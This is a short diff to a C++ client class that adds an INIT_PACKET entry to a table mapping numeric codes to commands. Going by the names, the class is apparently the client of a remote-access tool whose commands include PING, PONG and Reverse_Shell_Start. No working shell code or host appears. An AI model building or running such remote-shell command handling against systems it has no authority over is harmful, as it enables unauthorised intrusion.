@@ -36,6 +36,7 @@ class Cliente {
 		SOCKET sckSocket = INVALID_SOCKET;
 
 		std::map<std::string, EnumComandos::Enum> Comandos = {
+			{"498", EnumComandos::INIT_PACKET},
 			{"499", EnumComandos::PONG},
 			{"500", EnumComandos::PING},
 			{"501", EnumComandos::Reverse_Shell_Start},
